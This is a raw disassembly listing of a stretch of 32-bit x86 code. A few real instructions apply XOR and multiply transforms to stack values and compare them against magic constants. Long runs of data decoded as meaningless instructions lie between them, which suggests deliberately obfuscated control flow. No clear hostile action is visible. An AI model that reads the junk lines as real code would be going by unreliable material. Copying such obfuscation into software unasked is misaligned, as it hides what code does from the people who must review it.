  40193b:	jnp    0x4018ef
  40193d:	bound  esp,QWORD PTR [ebx-0x16e78990]
  401943:	mov    bh,0xa2
  401945:	pop    ds
  401946:	adc    al,0xa0
  401948:	fnstsw WORD PTR [edx]
  40194a:	fild   WORD PTR [esi-0x77]
  40194d:	inc    ebp
  40194e:	in     al,0x8b
  401950:	inc    ebp
  401951:	in     al,0xc7
  401953:	add    BYTE PTR [ecx-0x740760d3],ch
  401959:	inc    ebp
  40195a:	in     al,dx
  40195b:	mov    ebx,DWORD PTR [ebp-0x8]
  40195e:	xor    eax,ecx
  401960:	xor    ebx,ecx
  401962:	xor    edx,edx
  401964:	add    eax,esi
  401966:	add    ebx,esi
  401968:	div    ebx
  40196a:	mov    edx,DWORD PTR [ebp-0x2c]
  40196d:	cmp    eax,DWORD PTR [edx]
  40196f:	je     0x40271e
  401975:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  40197c:	lea    eax,[ebp-0xc]
  40197f:	mov    DWORD PTR [ebp-0x10],eax
  401982:	jmp    0x401b9f
  401987:	int3   
  401988:	sub    eax,0xbde9be20
  40198d:	push   0xffffffa9
  40198f:	mov    ebp,0xcd7bf628
  401994:	loopne 0x401968
  401996:	and    eax,0x70707a70
  40199b:	jo     0x401a1b
  40199d:	jo     0x401a0f
  40199f:	and    DWORD PTR [eax-0x54],edx
  4019a2:	(bad)  
  4019a3:	cmp    DWORD PTR [ecx-0x46],eax
  4019a6:	test   eax,0x8b99c9d
  4019ab:	dec    eax
  4019ac:	cmp    edx,esi
  4019ae:	jmp    0x4019fc
  4019b0:	jmp    0xe86983aa
  4019b5:	push   es
  4019b6:	ret    0x78c8
  4019b9:	mov    ecx,0xa44aa6b6
  4019be:	cwde   
  4019bf:	sbb    BYTE PTR [edi+0x39],cl
  4019c2:	inc    esp
  4019c3:	sti    
  4019c4:	jne    0x401a18
  4019c6:	pop    ebp
  4019c7:	arpl   WORD PTR [eax],cx
  4019c9:	pop    edi
  4019ca:	cmp    BYTE PTR [ecx+edx*8],0x2a
  4019ce:	mov    al,ds:0xf28bf67a
  4019d3:	sub    cl,ah
  4019d5:	adc    DWORD PTR ds:[eax-0x18],edx
  4019d9:	pop    edi
  4019da:	adc    al,0x59
  4019dc:	or     eax,0x2e4ffe87
  4019e1:	outs   dx,BYTE PTR ds:[esi]
  4019e2:	pusha  
  4019e3:	push   ebx
  4019e4:	mov    edi,0x73edca96
  4019e9:	adc    BYTE PTR [ebp+0x26d49529],al
  4019ef:	xchg   esp,eax
  4019f0:	mov    ch,0xe6
  4019f2:	xlat   BYTE PTR ds:[ebx]
  4019f3:	sub    esp,eax
  4019f5:	into   
  4019f6:	mov    esp,0x9cbcd1da
  4019fb:	adc    dl,BYTE PTR [ebx-0x6b]
  4019fe:	lods   al,BYTE PTR ds:[esi]
  4019ff:	mov    ch,0x50
  401a01:	pmaddwd mm5,mm5
  401a04:	mov    bl,0xb4
  401a06:	sbb    ch,dh
  401a08:	aaa    
  401a09:	lds    edi,FWORD PTR [ecx+edx*8]
  401a0c:	and    BYTE PTR [edi],bl
  401a0e:	adc    BYTE PTR [edx+eax*2-0x2c],dh
  401a12:	push   0xffffffc1
  401a14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a15:	sbb    ebx,0xffffff88
  401a18:	outs   dx,BYTE PTR ds:[esi]
  401a19:	int    0xcd
  401a1b:	aad    0x45
  401a1d:	test   al,0xd2
  401a1f:	mov    WORD PTR [eax-0x11],ss
  401a22:	mov    ss:0xee183ebf,eax
  401a28:	dec    ebp
  401a29:	in     eax,dx
  401a2a:	mov    eax,0x6682502e
  401a2f:	bound  ebp,QWORD PTR [eax+0x5c404e65]
  401a35:	fnstcw WORD PTR [ebp-0x13]
  401a38:	mov    ds:0x654b404a,eax
  401a3d:	push   edi
  401a3e:	sbb    ch,BYTE PTR [esi-0x24]
  401a41:	xchg   ebp,eax
  401a42:	adc    bl,ah
  401a44:	retf   
  401a45:	sti    
  401a46:	loop   0x401a45
  401a48:	mov    eax,ds:0x7c4c362a
  401a4d:	sbb    DWORD PTR fs:[ebx-0x8d9118e],edx
  401a54:	push   ds
  401a55:	add    eax,0xaa2a9407
  401a5a:	jnp    0x401a88
  401a5c:	add    bl,cl
  401a5e:	cmp    DWORD PTR [ecx],eax
  401a60:	and    eax,0x890a8f80
  401a65:	shr    bl,cl
  401a67:	and    esp,DWORD PTR [eax]
  401a69:	imul   ecx,DWORD PTR [eax+0x4d],0x421222c4
  401a70:	shl    DWORD PTR [eax-0x500d508f],0x23
  401a77:	lock or al,0xdc
  401a7a:	ret    
  401a7b:	mov    ah,0xce
  401a7d:	ins    DWORD PTR es:[edi],dx
  401a7e:	ds das 
  401a80:	mov    ?,esi
  401a82:	push   DWORD PTR [ebp+ebx*8-0x707629de]
  401a89:	mov    dl,0x3f
  401a8b:	add    eax,0xac9dbe40
  401a90:	lea    esi,[ebp+edi*4+0x1837ff5]
  401a97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a98:	psubsw mm2,QWORD PTR [esi]
  401a9b:	ss jmp 0x7b599aaa
  401aa1:	pop    es
  401aa2:	pop    ebx
  401aa3:	in     eax,0x25
  401aa5:	sub    al,0x8
  401aa7:	or     ebp,ebp
  401aa9:	les    ebx,FWORD PTR [esi+0x15]
  401aac:	in     eax,0xf4
  401aae:	pop    ecx
  401aaf:	pusha  
  401ab0:	or     DWORD PTR [edx+0xd],ecx
  401ab3:	stos   DWORD PTR es:[edi],eax
  401ab4:	std    
  401ab5:	test   DWORD PTR [ebx],esp
  401ab7:	test   BYTE PTR [ecx],cl
  401ab9:	and    eax,0x360c5073
  401abe:	stos   DWORD PTR es:[edi],eax
  401abf:	retf   
  401ac0:	push   edx
  401ac1:	js     0x401b14
  401ac3:	push   edi
  401ac4:	push   es
  401ac5:	enter  0xfdf1,0xac
  401ac9:	mov    ds:0x7cd8a063,al
  401ace:	xchg   ebx,eax
  401acf:	hlt    
  401ad0:	xor    al,0x27
  401ad2:	(bad)  
  401ad3:	xor    edi,ebp
  401ad5:	sub    al,0xe7
  401ad7:	xchg   DWORD PTR [esi-0x4b189d42],ebx
  401add:	fadd   st,st(2)
  401adf:	jl     0x401afb
  401ae1:	mov    eax,ds:0xd3d51777
  401ae6:	sub    bh,bh
  401ae8:	xor    ecx,edi
  401aea:	rcl    BYTE PTR [eax+0x2],0x4c
  401aee:	stc    
  401aef:	cmp    dh,dh
  401af1:	aad    0xf4
  401af3:	add    eax,0x389c6b08
  401af8:	pop    edx
  401af9:	xor    bl,BYTE PTR [ebx+0x140e48f8]
  401aff:	and    ch,BYTE PTR [ebx]
  401b01:	call   FWORD PTR [ebx+0x6b]
  401b04:	xor    BYTE PTR [ebx],0xa4
  401b07:	bound  ecx,QWORD PTR [edi+0x4]
  401b0a:	adc    edx,DWORD PTR [edx+0x77]
  401b0d:	stos   BYTE PTR es:[edi],al
  401b0e:	mov    dh,0x14
  401b10:	pop    ebx
  401b11:	cs inc esi
  401b13:	sub    BYTE PTR [edx+ebx*4+0x3d7b15f],al
  401b1a:	popf   
  401b1b:	in     eax,dx
  401b1c:	stos   DWORD PTR es:[edi],eax
  401b1d:	inc    esi
  401b1e:	jbe    0x401b44
  401b20:	inc    eax
  401b21:	cli    
  401b22:	inc    eax
  401b23:	sub    cl,BYTE PTR [edi+0x7e86f231]
  401b29:	popf   
  401b2a:	push   edx
  401b2c:	daa    
  401b2d:	(bad)  [esi]
  401b2f:	add    dl,dl
  401b31:	sbb    ah,dh
  401b33:	call   0xebf1:0x808e5895
  401b3a:	fdivr  QWORD PTR [edi]
  401b3c:	xchg   DWORD PTR [ebp+edx*8+0xb46c60d],edi
  401b43:	dec    esi
  401b44:	enter  0x260,0x3
  401b48:	(bad)  [ecx+edx*4-0x576f544b]
  401b4f:	mov    edx,0xc95f43b1
  401b54:	loope  0x401bbc
  401b56:	jbe    0x401af6
  401b58:	sub    al,0xbd
  401b5a:	jl     0x401b78
  401b5c:	std    
  401b5d:	pop    ss
  401b5e:	mov    al,0x4f
  401b60:	jmp    DWORD PTR [edx-0x4]
  401b63:	(bad)  
  401b64:	addr16 pop ecx
  401b66:	imul   ebx,DWORD PTR [ecx+ebp*2-0x73792c84],0xae5e8dca
  401b71:	cmp    DWORD PTR [ecx-0x7ab8da55],0x6e
  401b78:	or     al,0x0
  401b7a:	adc    ch,al
  401b7c:	adc    BYTE PTR [edi-0x2a],ah
  401b7f:	cmp    esi,DWORD PTR [edx-0x57]
  401b82:	jns    0x401bc1
  401b84:	sub    DWORD PTR [edx+0x60ee6926],ebp
  401b8a:	icebp  
  401b8b:	fstp   DWORD PTR [ebx-0x5b17420d]
  401b91:	and    eax,0xc94db367
  401b96:	retf   
  401b97:	retf   
  401b98:	pop    esi
  401b99:	imul   edx,DWORD PTR [ecx],0xae4d206a
  401b9f:	mov    eax,DWORD PTR [ebp-0x10]
  401ba2:	mov    edx,DWORD PTR [eax]
  401ba4:	imul   edx,edx,0xf89ea9ec
  401baa:	mov    DWORD PTR [eax],edx
  401bac:	mov    eax,DWORD PTR [ebp-0xc]
  401baf:	cmp    eax,0x742b26d4
  401bb4:	je     0x401bc8
  401bba:	mov    eax,DWORD PTR [ebp-0x1c]
  401bbd:	or     DWORD PTR [eax],0x60751c9c
  401bc3:	jmp    0x40272d
  401bc8:	mov    eax,DWORD PTR [ebp-0xc]
  401bcb:	jmp    0x401de8
  401bd0:	popa   
  401bd1:	ja     0x401bca
  401bd3:	add    esi,ecx
  401bd5:	xor    DWORD PTR [ecx+0x75],0xffffffde
  401bd9:	adc    al,0xb4
  401bdb:	mov    bl,bh
  401bdd:	dec    ebx
  401bde:	push   cs
  401bdf:	inc    edx
  401be0:	jo     0x401c5a
  401be2:	jo     0x401c54
  401be4:	jo     0x401c64
  401be6:	jo     0x401c58
  401be8:	push   ebp
  401be9:	cmp    al,0xd6
  401beb:	inc    ecx
  401bec:	jbe    0x401c10
  401bee:	or     esi,DWORD PTR [eax+0x1b]
  401bf1:	int3   
  401bf2:	cmp    dl,BYTE PTR [edx]
  401bf4:	shr    BYTE PTR [edx+ebp*4],0xd2
  401bf8:	dec    ecx
  401bf9:	test   al,0x2c
  401bfb:	jbe    0x401c07
  401bfd:	mov    DWORD PTR [ecx-0x29ae95b1],ebx
  401c03:	test   eax,0xd006a5dd
  401c08:	fiadd  WORD PTR [ebx-0xc31a32e]
  401c0e:	pop    edi
  401c0f:	in     eax,0x7f
  401c11:	mov    dl,0x0
  401c13:	sbb    edi,DWORD PTR [esi+0x2bdc6ae8]
  401c19:	or     BYTE PTR [edi-0x7f1bb7e3],bl
  401c1f:	adc    DWORD PTR [edi+0x2265ca56],edi
  401c25:	enter  0x35d0,0x37
  401c29:	addr16 sub bl,ah
  401c2c:	out    0xd5,eax
  401c2e:	jns    0x401bcc
  401c30:	hlt    
  401c31:	mov    es,WORD PTR [ebx+ebp*8-0x34515ec2]
  401c38:	stos   BYTE PTR es:[edi],al
  401c39:	scas   al,BYTE PTR es:[edi]
  401c3a:	add    BYTE PTR [edi-0x38],0x8
  401c3e:	hlt    
  401c3f:	rcl    DWORD PTR [edi-0x1892dce7],cl
  401c45:	dec    ebp
  401c46:	push   0xe59e6a13
  401c4b:	sbb    cl,dh
  401c4d:	aas    
  401c4e:	fidivr WORD PTR [ebp+0x1048df23]
  401c54:	out    dx,al
  401c55:	dec    ebx
  401c56:	inc    eax
  401c57:	test   eax,0xc3ca1c25
  401c5c:	(bad)  
  401c5e:	xchg   ecx,eax
  401c5f:	mov    esp,0x5bd20eeb
  401c64:	pop    edi
  401c65:	push   es
  401c66:	jle    0x401cb8
  401c68:	retf   
  401c69:	dec    ebx
  401c6a:	add    eax,0x186372d4
  401c6f:	cld    
  401c70:	les    eax,FWORD PTR [edx-0x4d]
  401c73:	sub    eax,0x9b038d9c
  401c78:	pusha  
  401c79:	jg     0x401c0d
  401c7b:	imul   esi,DWORD PTR [eax],0x299f4cb5
  401c81:	sbb    dh,BYTE PTR [esi+0x52]
  401c84:	inc    edi
  401c85:	fs test al,0x7
  401c88:	stos   BYTE PTR es:[edi],al
  401c89:	sbb    BYTE PTR [esi+0x7],dl
  401c8c:	fwait
  401c8d:	arpl   WORD PTR [edx-0x6711b36],sp
  401c93:	jb     0x401cdc
  401c95:	loopne 0x401c5d
  401c97:	pusha  
  401c98:	mov    DWORD PTR [edi-0x523103c3],ecx
  401c9e:	mov    bl,0x58
  401ca0:	ins    BYTE PTR es:[edi],dx
  401ca1:	outs   dx,BYTE PTR ds:[esi]
  401ca2:	sahf   
  401ca3:	sahf   
  401ca4:	scas   eax,DWORD PTR es:[edi]
  401ca5:	pop    ebx
  401ca6:	adc    eax,0x2d2c35de
  401cab:	cmp    esi,0x3
  401cae:	fnsave ds:0x9887710
  401cb4:	xchg   ecx,eax
  401cb5:	inc    ebp
  401cb6:	xor    BYTE PTR [ecx],bl
  401cb8:	imul   eax,DWORD PTR [edx],0x7b
  401cbb:	jb     0x401ced
  401cbd:	inc    ebp
  401cbe:	out    0xfe,eax
  401cc0:	hlt    
  401cc1:	mov    eax,0x6c42e1af
  401cc6:	sbb    eax,0x3fc81cbf
  401ccb:	pop    esp
  401ccc:	inc    ebp
  401ccd:	jp     0x401d44
  401ccf:	loop   0x401c5e
  401cd1:	test   eax,0x355d1a8e
  401cd6:	jnp    0x401c92
  401cd8:	out    dx,eax
  401cd9:	push   cs
  401cda:	popf   
  401cdb:	cmp    DWORD PTR [ecx],eax
  401cdd:	outs   dx,BYTE PTR ds:[esi]
  401cde:	adc    eax,edx
  401ce0:	stc    
  401ce1:	leave  
  401ce2:	jae    0x401cb3
  401ce4:	out    0xbb,al
  401ce6:	scas   eax,DWORD PTR es:[edi]
  401ce7:	xor    edi,edx
  401ce9:	jno    0x401cdd
  401ceb:	dec    BYTE PTR [di-0x5a80]
  401cf0:	xchg   ecx,eax
  401cf1:	push   ss
  401cf2:	dec    edx
  401cf3:	jnp    0x401cae
  401cf5:	inc    esp
  401cf6:	retf   0x1474
  401cf9:	mov    ah,0xfe
  401cfb:	mov    ah,BYTE PTR [ebp+0x34]
  401cfe:	es pop eax
  401d00:	cmp    DWORD PTR ds:0xf9843f27,ecx
  401d06:	leave  
  401d07:	mov    al,ds:0xbd39993c
  401d0c:	(bad)  
  401d0d:	sub    edx,DWORD PTR [ecx+0x6ebc43d1]
  401d13:	ja     0x401d45
  401d15:	mov    bh,dh
  401d17:	dec    edi
  401d18:	xchg   edx,eax
  401d19:	ds out dx,eax
  401d1b:	scas   al,BYTE PTR es:[edi]
  401d1c:	(bad)  
  401d1d:	lds    ecx,FWORD PTR [edi+0x5586d34d]
  401d23:	arpl   WORD PTR [edx+esi*1-0x6],cx
  401d27:	pop    esi
  401d28:	es ins BYTE PTR es:[edi],dx
  401d2a:	lahf   
  401d2b:	retf   
  401d2c:	push   eax
  401d2d:	push   eax
  401d2e:	sbb    esp,DWORD PTR [ebx-0x64]
  401d31:	push   ebx
  401d32:	xchg   BYTE PTR [edx],ch
  401d34:	mov    edx,0xa7fd60eb
  401d39:	pop    edi
  401d3a:	icebp  
  401d3b:	and    eax,0xe6c954b0
  401d40:	and    al,bl
  401d42:	lahf   
  401d43:	push   ds
  401d44:	lods   eax,DWORD PTR ds:[esi]
  401d45:	xor    eax,0x674ed18a
  401d4a:	int3   
  401d4b:	add    DWORD PTR [ecx+ecx*4-0x26],0x69
  401d50:	adc    eax,DWORD PTR [ebx-0x493d8dc2]
  401d56:	lods   eax,DWORD PTR ds:[esi]
  401d57:	mov    bl,0x48
  401d59:	xor    dh,BYTE PTR [eax-0x588897d2]
  401d5f:	adc    ah,BYTE PTR [ebp-0x25a0e010]
  401d65:	push   esi
  401d66:	rcr    DWORD PTR [eax],cl
  401d68:	cmp    al,0x53
  401d6a:	mov    esi,0x5686205e
  401d6f:	add    ecx,DWORD PTR [eax+0x39aac27]
  401d75:	(bad)  
  401d76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d77:	xchg   edi,eax
  401d78:	cmp    al,0xdb
  401d7a:	xor    ecx,DWORD PTR fs:[ebx]
  401d7d:	ret    0x36e1
  401d80:	sub    eax,0x4c85b6bf
  401d85:	cmp    BYTE PTR [edx],0x85
  401d88:	mov    BYTE PTR [edi+0x6d],0x9c
  401d8c:	les    eax,FWORD PTR [edx-0x26]
  401d8f:	mov    al,ds:0xc74b9d3a
  401d94:	mov    al,ds:0x66ba0100
  401d99:	or     ebp,DWORD PTR [edi-0x40]
  401d9c:	push   es
  401d9d:	loop   0x401d54
  401d9f:	or     DWORD PTR [eax+0x6d477936],edx
  401da5:	mov    edi,0x2cd7db80
  401daa:	inc    ecx
  401dab:	aad    0x4b
  401dad:	out    dx,eax
  401dae:	xchg   ecx,eax
  401daf:	std    
  401db0:	mov    dh,BYTE PTR [edi+0x720ffe22]
  401db6:	push   es
  401db7:	mov    ss,eax
  401db9:	ror    BYTE PTR [edx],0x4e
  401dbc:	mov    BYTE PTR [edi-0x6d36413d],dh
  401dc2:	xchg   ebp,eax
  401dc3:	lahf   
  401dc4:	mov    eax,ds:0x8b792432
  401dc9:	addr16 dec ecx
  401dcb:	or     al,0x1f
  401dcd:	cwde   
  401dce:	and    DWORD PTR [ebx-0x4f],edx
  401dd1:	push   esp
  401dd2:	add    ecx,eax
  401dd4:	add    ebx,DWORD PTR [ebp+0x5c11a0a]
  401dda:	pop    ecx
  401ddb:	div    al
  401ddd:	mov    BYTE PTR [esi],ah
  401ddf:	fs daa 
  401de1:	sub    BYTE PTR [ecx],ch
  401de3:	xor    BYTE PTR [ebx],ch
  401de5:	pop    ebx
  401de6:	(bad)  
  401de7:	test   al,0x3
  401de9:	inc    ebp
  401dea:	call   0xca949b2c
  401def:	ins    BYTE PTR es:[edi],dx
  401df0:	je     0x401e04
  401df6:	mov    eax,DWORD PTR [ebp-0x10]
  401df9:	and    DWORD PTR [eax],0x751c99
  401dff:	jmp    0x40272d
  401e04:	mov    eax,DWORD PTR [ebp-0xc]
  401e07:	mov    edx,DWORD PTR [ebp-0x18]
  401e0a:	or     eax,edx
  401e0c:	cmp    eax,0xfcbf2ffd
  401e11:	je     0x401e25
  401e17:	mov    eax,DWORD PTR [ebp-0x10]
  401e1a:	xor    DWORD PTR [eax],0x2650fa8f
  401e20:	jmp    0x40272d
  401e25:	mov    ax,WORD PTR [ebp-0x4]
  401e29:	mov    edx,0x8a3e
  401e2e:	xor    ax,dx
  401e31:	jmp    0x40204e
  401e36:	cld    
  401e37:	test   BYTE PTR [edx+0x3d],ch
  401e3a:	jb     0x401e31
  401e3c:	stos   DWORD PTR es:[edi],eax
  401e3d:	inc    ecx
  401e3e:	inc    eax
  401e3f:	(bad)  
  401e40:	cmp    BYTE PTR [eax+edi*1-0x12],dl
  401e44:	xor    bh,ah
  401e46:	jo     0x401e4e
  401e48:	jo     0x401eba
  401e4a:	jo     0x401eca
  401e4c:	jo     0x401ebe
  401e4e:	dec    esi
  401e4f:	inc    esp
  401e50:	cmp    eax,esi
  401e52:	scas   al,BYTE PTR es:[edi]
  401e53:	(bad)  
  401e54:	xchg   ecx,eax
  401e55:	inc    BYTE PTR [ecx-0x299ba52e]
  401e5b:	pop    ecx
  401e5c:	ja     0x401e8f
  401e5e:	dec    edi
  401e5f:	pusha  
  401e60:	dec    ebx
  401e61:	sbb    al,0x56
  401e63:	aas    
  401e64:	cmp    al,0x4c
  401e66:	dec    esp
  401e67:	(bad)  
  401e68:	lock xor DWORD PTR [eax-0x62],esi
  401e6c:	pop    es
  401e6d:	std    
  401e6e:	(bad)  
  401e6f:	xchg   esp,eax
  401e70:	jne    0x401eb7
  401e72:	enter  0xb263,0x69
  401e76:	repz or BYTE PTR [eax],al
  401e79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e7b:	xor    dl,0x1f
  401e7e:	(bad)  
  401e7f:	mov    dh,0x8c
  401e81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e82:	mov    al,ds:0x11c680d9
  401e87:	add    ah,BYTE PTR [ebx]
  401e89:	mov    bl,0xa7
  401e8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e8c:	rdmsr  
  401e8e:	(bad)  
  401e8f:	xor    ebx,DWORD PTR [ebx+0x46]
  401e92:	or     ecx,esi
  401e94:	inc    eax
  401e95:	(bad)
  401e98:	nop
  401e99:	stos   DWORD PTR es:[edi],eax
  401e9a:	lods   al,BYTE PTR ds:[esi]
  401e9b:	test   DWORD PTR [ebp-0x79],eax
  401e9e:	cmp    al,0xe7
  401ea0:	aad    0xcd
  401ea2:	daa    
  401ea3:	dec    edx
  401ea4:	lock mov eax,0xf516a1ba
  401eaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401eab:	adc    dl,dl
  401ead:	dec    edx
  401eae:	pop    esi
  401eaf:	dec    edx
  401eb0:	sar    BYTE PTR [eax],1
  401eb2:	jns    0x401f0a
  401eb4:	aad    0x23
  401eb6:	ins    DWORD PTR es:[edi],dx
  401eb7:	sub    ah,al
  401eb9:	and    al,0x59
  401ebb:	jl     0x401eb8
  401ebd:	dec    esp
  401ebe:	or     eax,0xabbb4777
  401ec3:	jnp    0x401e6c
  401ec5:	mov    BYTE PTR [edx],dl
  401ec7:	cmp    bl,BYTE PTR [ebx-0x7b]
  401eca:	xchg   ebx,eax
  401ecb:	call   0x801e166a
  401ed0:	test   eax,edx
  401ed2:	and    ebx,DWORD PTR [ebx]
  401ed4:	dec    ecx
  401ed5:	lea    eax,[esi]
  401ed7:	pop    ecx
  401ed8:	or     DWORD PTR [ecx+0x6],esp
  401edb:	fisubr WORD PTR [ebx]
  401edd:	jbe    0x401ed4
  401edf:	into   
  401ee0:	sbb    BYTE PTR [esi+0x5a],ah
  401ee3:	push   ebx
  401ee4:	inc    esp
  401ee5:	sti    
  401ee6:	push   0xffffffef
  401ee8:	cmp    DWORD PTR [edi],0xffffffd2
  401eeb:	adc    esi,DWORD PTR [ebp+0x64]
  401eee:	lahf   
  401eef:	xchg   esp,eax
  401ef0:	stos   DWORD PTR es:[edi],eax
  401ef1:	bound  edx,QWORD PTR [ecx+eiz*1+0xd6d6a62]
  401ef8:	inc    esp
  401ef9:	pop    es
  401efa:	das    
  401efb:	lock push ebp
  401efd:	jg     0x401f76
  401eff:	popa   
  401f00:	or     eax,0x87567c1b
  401f05:	and    ecx,DWORD PTR [ebx-0x46]
  401f08:	pop    eax
  401f09:	fs aam 0x22
  401f0c:	pop    esi
  401f0d:	xor    eax,0xf5dc3c8a
  401f12:	push   ecx
  401f13:	mov    edx,DWORD PTR [ebp+0x60ea3515]
  401f19:	xchg   esi,eax
  401f1a:	lods   eax,DWORD PTR ds:[esi]
  401f1b:	adc    BYTE PTR [ecx-0x277c99fa],ah
  401f21:	push   esi
  401f22:	xchg   ebx,eax
  401f23:	into   
  401f24:	cwde   
  401f25:	sub    BYTE PTR [eax],0x44
  401f28:	mov    edx,0x2f969089
  401f2d:	cs jo  0x401f46
  401f30:	pop    ecx
  401f31:	jl     0x401f8e
  401f33:	lock cli 
  401f35:	aas    
  401f36:	fsubr  QWORD PTR [ecx-0x567d4c8b]
  401f3c:	int3   
  401f3d:	or     eax,0xa38ae50b
  401f42:	dec    edi
  401f43:	ss ins BYTE PTR es:[edi],dx
  401f45:	aas    
  401f46:	cwde   
  401f47:	adc    DWORD PTR [edi],0xf8c9e24a
  401f4d:	pushf  
  401f4e:	icebp  
  401f4f:	pop    ebp
  401f50:	and    ah,cl
  401f52:	adc    DWORD PTR [edx],edi
  401f54:	pop    ss
  401f55:	int    0x9f
  401f57:	std    
  401f58:	lods   eax,DWORD PTR ds:[esi]
  401f59:	test   al,0xba
  401f5b:	bound  ecx,QWORD PTR [ebx-0x10]
  401f5e:	jge    0x401f71
  401f60:	mov    al,0x15
  401f62:	(bad)  
  401f63:	in     eax,dx
  401f64:	inc    ebp
  401f65:	or     edx,DWORD PTR [ebx+edi*2]
  401f68:	addr16 lahf 
  401f6a:	jle    0x401fe7
  401f6c:	mov    eax,ds:0x929252d6
  401f71:	stos   DWORD PTR es:[edi],eax
  401f72:	out    dx,al
  401f73:	dec    esi
  401f74:	ins    BYTE PTR es:[edi],dx
  401f75:	mov    ebx,0xa056da5a
  401f7a:	out    dx,eax
  401f7b:	repnz dec ebx
  401f7d:	add    dh,dh
  401f7f:	cmp    al,0xea
  401f81:	mov    ebx,0x3de6c6ef
  401f86:	xor    edi,edi
  401f88:	scas   al,BYTE PTR es:[edi]
  401f89:	mov    edi,0x9d9a10ce
  401f8e:	mov    WORD PTR [edx+0x110ffd2f],fs
  401f94:	stos   DWORD PTR es:[edi],eax
  401f95:	fldcw  WORD PTR [eax-0x577d8d27]
  401f9b:	cmp    ebx,ebx
  401f9d:	cwde   
  401f9e:	inc    ebx
  401f9f:	stos   DWORD PTR es:[edi],eax
  401fa0:	outs   dx,BYTE PTR ds:[esi]
  401fa1:	sahf   
  401fa2:	fidiv  WORD PTR [esi-0x58]
  401fa5:	(bad)  
  401fa6:	dec    edi
  401fa7:	shl    DWORD PTR [edi-0x55fe1b8a],cl
  401fad:	call   0xedf9:0xd886606a
  401fb4:	out    0x60,al
  401fb6:	test   DWORD PTR [ebp+0xb9b2506],ebx
  401fbc:	jae    0x401f69
  401fbe:	push   edx
  401fbf:	push   ds
  401fc0:	mov    dl,0x59
  401fc2:	scas   al,BYTE PTR es:[edi]
  401fc3:	mov    ebx,edx
  401fc5:	cmp    dl,ah
  401fc7:	test   eax,0x2fa2ca0f
  401fcc:	push   ebp
  401fcd:	pop    ebp
  401fce:	xchg   ecx,eax
  401fcf:	cld    
  401fd0:	adc    BYTE PTR [eax],0xb8
  401fd3:	(bad)  
  401fd4:	jo     0x401fe6
  401fd6:	call   0x390eace7
  401fdb:	int    0xca
  401fdd:	in     al,dx
  401fde:	mov    WORD PTR [esi],?
  401fe0:	imul   ebp,DWORD PTR [ebx],0x23c27644
  401fe6:	cmp    esp,ecx
  401fe8:	jne    0x401f97
  401fea:	pop    esi
  401feb:	ins    BYTE PTR es:[edi],dx
  401fec:	rcl    esi,1
  401fee:	sbb    DWORD PTR [ebx+0x53],esi
  401ff1:	cmp    eax,0x14d2328d
  401ff6:	pop    ss
  401ff7:	fcomp  QWORD PTR [ebp-0x4d]
  401ffa:	sti    
  401ffb:	(bad)  
  401ffc:	(bad)  
  401ffe:	jmp    DWORD PTR [esp+ebp*1-0x48]
  402002:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402003:	int    0x75
  402005:	fbld   TBYTE PTR [edi+ebp*2]
  402008:	std    
  402009:	add    ah,0xc0
  40200c:	nop
  40200d:	push   ebx
  40200e:	lahf   
  40200f:	jmp    0xcdc8:0x227862eb
  402016:	push   ecx
  402017:	ja     0x402096
  402019:	adc    esi,0x25101dda
  40201f:	stos   BYTE PTR es:[edi],al
  402020:	and    BYTE PTR [eax+0x72],dh
  402023:	fbld   TBYTE PTR [edx+0x35]
  402026:	jbe    0x401fb0
  402028:	cmp    al,0x71
  40202a:	pop    ebp
  40202b:	imul   eax,DWORD PTR [edx-0x2b],0x22819fd1
  402032:	retf   
  402033:	cdq    
  402034:	xchg   edi,eax
  402035:	or     BYTE PTR [esi],ah
  402037:	das    
  402038:	inc    ecx
  402039:	xchg   ecx,eax
  40203a:	mov    WORD PTR [eax+0x68],?
  40203d:	jmp    0x73c1:0x856b897a
  402044:	(bad)  
  402045:	jmp    0x40201e
  402047:	ja     0x402049
  402049:	das    
  40204a:	(bad)  
  40204b:	out    dx,eax
  40204c:	push   ds
  40204d:	push   ebp
  40204e:	mov    edx,DWORD PTR [ebp-0x28]
  402051:	mov    edx,DWORD PTR [edx]
  402053:	add    ax,di
  402056:	cmp    ax,WORD PTR [edx]
  402059:	jmp    0x402276
  40205e:	ret    0x801a
  402061:	gs push 0xfb99f171
  402067:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402068:	ins    BYTE PTR es:[edi],dx
  402069:	add    BYTE PTR [ebp+0x707bd435],0x4
  402070:	jo     0x4020e2
  402072:	jo     0x4020f2
  402074:	jo     0x4020e6
  402076:	cmc    
  402077:	(bad)  
  402078:	and    BYTE PTR [ebx],cl
  40207a:	ds retf 
  40207c:	or     ebx,DWORD PTR [esi]
  40207e:	test   ebp,0x52ee42ee
  402084:	xor    al,0x8f
  402086:	mov    cl,0x56
  402088:	cdq    
  402089:	adc    ecx,DWORD PTR [edx-0x53]
  40208c:	aas    
  40208d:	outs   dx,DWORD PTR ds:[esi]
  40208e:	push   ss
  40208f:	ret    
  402090:	dec    ecx
  402091:	inc    ebp
  402092:	aaa    
  402093:	or     eax,DWORD PTR [eax]
  402095:	push   0x16d956e5
  40209a:	and    DWORD PTR [eax-0x4e],ecx
  40209d:	mov    eax,0xb75eeb48
  4020a2:	jo     0x402067
  4020a4:	in     eax,0x78
  4020a6:	pushf  
  4020a7:	lea    ebp,[esi]
  4020a9:	push   ds
  4020aa:	xor    dh,0x2f
  4020ad:	(bad)  
  4020ae:	scas   eax,DWORD PTR es:[edi]
  4020af:	mov    DWORD PTR [ecx-0x479ccd91],esi
  4020b5:	push   edx
  4020b6:	div    BYTE PTR [ebx-0x2844bd17]
  4020bc:	xchg   edx,eax
  4020bd:	stc    
  4020be:	fld    QWORD PTR [ebx+0x1b]
  4020c1:	je     0x40211d
  4020c3:	pop    ebp
  4020c4:	sar    eax,cl
  4020c6:	inc    esp
  4020c7:	rcr    BYTE PTR [ebx-0x5e],0x6f
  4020cb:	imul   edx,edi,0xdfebe48b
  4020d1:	popf   
  4020d2:	add    ebx,DWORD PTR [edx-0x54]
